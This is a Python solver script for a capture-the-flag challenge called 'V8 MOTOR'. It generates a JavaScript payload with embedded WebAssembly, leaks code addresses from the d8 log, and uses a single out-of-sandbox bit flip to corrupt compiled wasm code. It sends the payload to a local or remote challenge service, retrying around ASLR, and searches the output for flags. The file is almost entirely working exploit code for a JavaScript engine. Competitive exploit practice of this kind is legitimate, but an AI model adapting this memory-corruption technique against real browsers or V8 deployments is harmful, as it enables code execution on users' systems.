#!/usr/bin/env python3
import argparse
import re
import socket
import ssl
import subprocess
import sys
import time

# Challenge: V8 MOTOR
# Protocol: first line = exact JS payload length, then raw JS payload.
# Primitive: one out-of-sandbox bit flip.

FLAG_RE = re.compile(rb"(?:TFCCTF|LOCALFLAG|ASIS|COMPFEST18|NNS|brunner)\{[^}\r\n]+\}")

WASM = [
    0,97,115,109,1,0,0,0,1,6,1,96,1,127,1,127,3,2,1,0,7,8,1,4,
    109,97,105,110,0,0,10,244,1,1,241,1,0,66,128,128,128,128,144,
    162,196,136,17,26,66,144,161,198,129,140,234,250,129,144,127,26,
    66,198,137,144,249,178,157,129,200,144,127,26,66,198,137,145,137,
    160,238,250,129,144,127,26,66,198,137,145,145,192,236,250,129,144,
    127,26,66,198,137,145,153,224,236,250,129,144,127,26,66,198,137,
    145,161,192,237,250,129,144,127,26,66,198,137,145,169,144,236,250,
    129,144,127,26,66,198,137,145,177,240,236,250,129,144,127,26,66,
    200,146,158,143,163,250,250,129,144,127,26,66,210,174,161,202,232,
    252,250,129,144,127,26,66,234,246,224,250,208,128,164,200,144,127,
    26,66,128,128,128,128,160,196,136,145,34,26,66,129,128,128,128,160,
    196,136,145,34,26,66,130,128,128,128,160,196,136,145,34,26,66,131,
    128,128,128,160,196,136,145,34,26,66,132,128,128,128,160,196,136,
    145,34,26,66,133,128,128,128,160,196,136,145,34,26,66,134,128,128,
    128,160,196,136,145,34,26,32,0,69,4,127,65,0,5,32,0,65,1,107,
    16,0,65,1,106,11,11
]

# Offset tergantung layout source JS.
# Jangan reformat JS_TEMPLATE kalau belum kalibrasi ulang.
ADJ = "1456"

JS_TEMPLATE = r'''
const ADJS = "{adj}";
const ADJ = Number(ADJS);

function h(x){{ return x + 1; }}
h(1);

let bytes = new Uint8Array([{wasm}]);
let inst = new WebAssembly.Instance(new WebAssembly.Module(bytes));

inst.exports.main(1);

let log = d8.log.getAndStop();

let mSfi = /code-creation,JS,\d+,\d+,0x[0-9a-f]+,\d+,h .*?,(0x[0-9a-f]+),/.exec(log);
let mWasm = /code-creation,JS,\d+,\d+,(0x[0-9a-f]+),384,wasm-function\[0\]/.exec(log);

if (!mSfi || !mWasm) {{
    print('missing');
    quit(2);
}}

let sfi = BigInt(mSfi[1]);
let code = BigInt(mWasm[1]);

print('LEAK ' + mSfi[1] + ' ' + code.toString(16));

let obj = sfi + BigInt(ADJ);
let target = code + 0x18n;

let bitoff = (target - obj) * 8n;

if (bitoff < 0n || bitoff > 9007199254740991n) {{
    print('bad bitoff');
    quit(3);
}}

bitFlip(h, Number(bitoff));

inst.exports.main(0x7fffffff);
'''

def make_payload() -> bytes:
    return JS_TEMPLATE.format(
        adj=ADJ,
        wasm=",".join(map(str, WASM)),
    ).encode()

def pack_payload(payload: bytes) -> bytes:
    return str(len(payload)).encode() + b"\n" + payload

def run_local(runsh: str, tries: int, timeout: float) -> bytes:
    payload = make_payload()
    packet = pack_payload(payload)
    last = b""

    for i in range(1, tries + 1):
        try:
            p = subprocess.run(
                [runsh],
                input=packet,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
            )
            out = p.stdout + p.stderr
        except subprocess.TimeoutExpired as e:
            out = (e.stdout or b"") + (e.stderr or b"")

        last = out

        m = FLAG_RE.search(out)
        if m:
            print(out.decode(errors="replace"), end="")
            return out

        if b"bad bitoff" not in out:
            print(out.decode(errors="replace"), end="")
            return out

        print(f"[*] try {i}: unlucky ASLR, retrying...", file=sys.stderr)

    print(last.decode(errors="replace"), end="")
    return last

def connect_remote(host: str, port: int, timeout: float, use_ssl: bool) -> socket.socket:
    """Connect to the challenge, optionally wrapping the TCP socket in TLS."""
    raw = socket.create_connection((host, port), timeout=timeout)

    if not use_ssl:
        return raw

    # CTF endpoints commonly use a self-signed certificate.  ncat --ssl does
    # not require the certificate to chain to a public CA either, so mirror
    # that behavior while still sending SNI for TLS frontends.
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    try:
        return context.wrap_socket(raw, server_hostname=host)
    except BaseException:
        raw.close()
        raise


def run_remote(
    host: str, port: int, tries: int, timeout: float, use_ssl: bool
) -> bytes:
    payload = make_payload()
    packet = pack_payload(payload)
    last = b""

    for i in range(1, tries + 1):
        out = b""

        try:
            with connect_remote(host, port, timeout, use_ssl) as s:
                s.settimeout(timeout)
                s.sendall(packet)

                while True:
                    try:
                        chunk = s.recv(4096)
                    except socket.timeout:
                        break

                    if not chunk:
                        break

                    out += chunk

        except OSError as e:
            out += f"[socket error] {e}\n".encode()

        last = out

        m = FLAG_RE.search(out)
        if m:
            print(out.decode(errors="replace"), end="")
            return out

        if b"bad bitoff" not in out:
            print(out.decode(errors="replace"), end="")
            return out

        print(f"[*] try {i}: unlucky ASLR, retrying...", file=sys.stderr)
        time.sleep(0.05)

    print(last.decode(errors="replace"), end="")
    return last

def main() -> None:
    ap = argparse.ArgumentParser(description="solver for V8 MOTOR")
    ap.add_argument("host", nargs="?", help="remote host")
    ap.add_argument("port", nargs="?", type=int, help="remote port")
    ap.add_argument("--local", metavar="RUN_SH", help="run against local run.sh")
    ap.add_argument("--tries", type=int, default=50)
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--dump", metavar="FILE", help="dump JS payload then exit")
    ap.add_argument(
        "--plain",
        action="store_true",
        help="use plain TCP instead of TLS for the remote connection",
    )
    args = ap.parse_args()

    if args.dump:
        with open(args.dump, "wb") as f:
            f.write(make_payload())
        print(f"wrote {args.dump}")
        return

    if args.local:
        run_local(args.local, args.tries, args.timeout)
        return

    if not args.host or args.port is None:
        ap.print_usage(sys.stderr)
        print("\nexamples:", file=sys.stderr)
        print("  python3 solve.py HOST PORT", file=sys.stderr)
        print("  python3 solve.py --local ./run.sh", file=sys.stderr)
        sys.exit(2)

    run_remote(args.host, args.port, args.tries, args.timeout, not args.plain)

if __name__ == "__main__":
    main()
